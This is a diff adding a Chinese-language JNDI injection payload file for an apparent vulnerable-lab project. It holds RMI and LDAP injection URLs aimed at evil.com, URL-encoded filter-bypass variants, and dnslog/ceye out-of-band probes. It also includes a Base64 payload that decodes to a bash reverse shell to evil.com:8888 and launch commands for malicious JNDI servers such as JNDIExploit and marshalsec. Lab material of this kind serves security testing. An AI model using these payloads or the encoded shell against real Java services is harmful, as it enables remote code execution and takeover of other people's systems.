@@ -1,0 +1,206 @@
+# JNDI 注入漏洞测试用例
+# 漏洞类型: JNDI RMI/LDAP 远程代码加载
+# 危险等级: 高危 (High)
+
+# ============================================
+# 1. JNDI RMI 注入 - 基础测试
+# ============================================
+# 端点: /jndi/rmi/vuln?url={payload}
+
+# 基础 RMI 注入
+url=rmi://evil.com:1099/Exploit
+
+# 使用 IP 地址
+url=rmi://192.168.1.100:1099/Exploit
+url=rmi://127.0.0.1:1099/Exploit
+
+# 指定不同端口
+url=rmi://evil.com:1099/Exploit
+url=rmi://evil.com:9999/Exploit
+
+# 不同对象名称
+url=rmi://evil.com:1099/RemoteObj
+url=rmi://evil.com:1099/evil
+
+
+# ============================================
+# 2. JNDI LDAP 注入 - 基础测试
+# ============================================
+# 端点: /jndi/ldap/vuln?url={payload}
+
+# 基础 LDAP 注入
+url=ldap://evil.com:1389/Exploit
+
+# 使用 IP 地址
+url=ldap://192.168.1.100:1389/Exploit
+url=ldap://127.0.0.1:1389/Exploit
+
+# 指定不同端口
+url=ldap://evil.com:1389/Exploit
+url=ldap://evil.com:9999/Exploit
+
+# 不同 DN 格式
+url=ldap://evil.com:1389/cn=Exploit,dc=evil,dc=com
+url=ldap://evil.com:1389/ou=services,dc=evil,dc=com
+
+
+# ============================================
+# 3. JNDI RMI - 配置加载场景
+# ============================================
+# 端点: /jndi/rmi/config?config={payload}
+
+# 远程配置加载
+config=rmi://evil.com:1099/Config
+config=rmi://evil.com:1099/AppConfig
+
+
+# ============================================
+# 4. JNDI RMI - 数据源场景
+# ============================================
+# 端点: /jndi/rmi/datasource?name={payload}
+
+# 恶意数据源
+name=rmi://evil.com:1099/MaliciousDS
+name=rmi://evil.com:1099/evil
+
+
+# ============================================
+# 5. JNDI LDAP - 认证场景
+# ============================================
+# 端点: /jndi/ldap/auth?userDN={payload}
+
+# 恶意用户 DN
+userDN=ldap://evil.com:1389/EvilUser
+userDN=ldap://evil.com:1389/cn=admin,dc=evil,dc=com
+
+
+# ============================================
+# 6. JNDI LDAP - 服务发现场景
+# ============================================
+# 端点: /jndi/ldap/discover?service={payload}
+
+# 恶意服务
+service=ldap://evil.com:1389/EvilService
+service=ldap://evil.com:1389/RemoteService
+
+
+# ============================================
+# 7. DNS 外带检测 (无需恶意服务器)
+# ============================================
+
+# 使用 dnslog.cn 进行外带检测
+url=ldap://xxx.dnslog.cn:1389/Exploit
+url=rmi://xxx.dnslog.cn:1099/Exploit
+
+# 使用 ceye.io
+url=ldap://xxx.ceye.io:1389/Exploit
+url=rmi://xxx.ceye.io:1099/Exploit
+
+
+# ============================================
+# 8. RCE Payload (需要恶意 JNDI 服务器)
+# ============================================
+
+# JNDIExploit 工具格式
+# 启动: java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888
+url=ldap://evil.com:1389/Basic/Command/Base64/YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS84ODg4IDA+JjEn
+
+# marshalsec 工具格式
+# 启动: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#Exploit" 1099
+url=rmi://evil.com:1099/Exploit
+
+# Tomcat Echo
+url=ldap://evil.com:1389/TomcatEcho
+
+# Spring 回显
+url=ldap://evil.com:1389/SpringEcho
+
+# Groovy 回显
+url=ldap://evil.com:1389/GroovyEcho
+
+# CommonsBeanutils1
+url=ldap://evil.com:1389/CommonsBeanutils1
+
+
+# ============================================
+# 9. 绕过技巧
+# ============================================
+
+# 使用不同的 URL 编码
+url=%6C%64%61%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%3A%31%33%38%39%2F%45%78%70%6C%6F%69%74
+url=%72%6D%69%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%3A%31%30%39%39%2F%45%78%70%6C%6F%69%74
+
+# 双重编码
+url=%25%36%43%25%36%34%25%36%31%25%37%30%25%33%41%25%32%46%25%32%46%25%36%35%25%37%36%25%36%39%25%36%43%25%32%45%25%36%33%25%36%46%25%36%44
+
+
+# ============================================
+# 10. 检测方法
+# ============================================
+
+# 方法 1: DNS 外带 (推荐)
+# 1. 访问 http://dnslog.cn 获取子域名
+# 2. 发送: url=ldap://xxx.dnslog.cn:1389/Exploit
+# 3. 在 dnslog.cn 查看是否有 DNS 解析记录
+
+# 方法 2: 延迟检测
+# 发送指向不存在服务器的请求
+# url=ldap://192.168.1.999:1389/Exploit
+# 如果响应明显延迟，说明存在 JNDI 查询
+
+# 方法 3: 使用本地恶意服务器
+# 1. 启动 evil_ldap_server.py
+# 2. 发送: url=ldap://localhost:1389/Exploit
+# 3. 检查服务器是否收到连接
+
+# 方法 4: 错误消息分析
+# 如果返回 "NamingException" 且包含目标主机信息，说明存在漏洞
+
+
+# ============================================
+# 11. 受影响的 JDK 版本
+# ============================================
+
+# JNDI 远程类加载限制:
+# - JDK 6u132 及以下: RMI 和 LDAP 都可远程加载
+# - JDK 6u132+: LDAP 被限制，RMI 仍可
+# - JDK 7u122 及以下: RMI 和 LDAP 都可远程加载
+# - JDK 7u122+: LDAP 被限制，RMI 仍可
+# - JDK 8u113 及以下: RMI 和 LDAP 都可远程加载
+# - JDK 8u113+: LDAP 被限制，RMI 仍可
+# - JDK 8u191+: RMI 和 LDAP 都被限制 (但仍可通过本地 Gadget 绕过)
+
+# 系统属性控制:
+# com.sun.jndi.rmi.object.trustURLCodebase=true/false
+# com.sun.jndi.ldap.object.trustURLCodebase=true/false
+
+
+# ============================================
+# 12. 工具推荐
+# ============================================
+
+# 1. JNDIExploit (推荐)
+# https://github.com/WhiteHSBG/JNDIExploit
+# java -jar JNDIExploit.jar -i 0.0.0.0 -p 8888
+
+# 2. marshalsec
+# https://github.com/mbechler/marshalsec
+# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#Exploit" 1099
+
+# 3. Rogue JNDI
+# https://github.com/marchandd/Rogue-JNDI
+# java -jar target/RogueJNDI-2.0.jar --hostname 0.0.0.0 --port 1389
+
+# 4. Python evil_ldap_server.py (本靶场附带)
+# python3 validation/jndi-server/evil_ldap_server.py
+
+
+# ============================================
+# 13. 验证成功的特征
+# ============================================
+
+# 1. DNS 外带成功 (dnslog.cn 收到查询)
+# 2. 响应明显延迟 (等待 JNDI 连接超时)
+# 3. 恶意服务器收到连接
+# 4. 错误消息包含目标主机信息
+# 5. 命令执行成功 (需要恶意服务器返回有效 payload)
